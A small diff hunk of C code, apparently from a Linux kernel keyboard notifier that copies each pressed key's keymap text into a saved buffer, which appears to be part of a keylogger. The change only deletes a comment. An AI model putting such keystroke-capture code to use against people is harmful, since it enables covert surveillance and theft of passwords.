@@ -102,7 +102,7 @@ int catch_key(struct notifier_block *nblock, unsigned long code, void * _param) 
                 curr_offset += lenmap[RSHIFT]+1;
                 break;
             default:
-                if (param->down) { //if len is bigger than 1, add space in buffer [blank | keymap ret | blank]
+                if (param->down) {
                     memcpy(savedBuf + curr_offset, keymap[param->value], lenmap[param->value]);
                     curr_offset += lenmap[param->value];
                 }
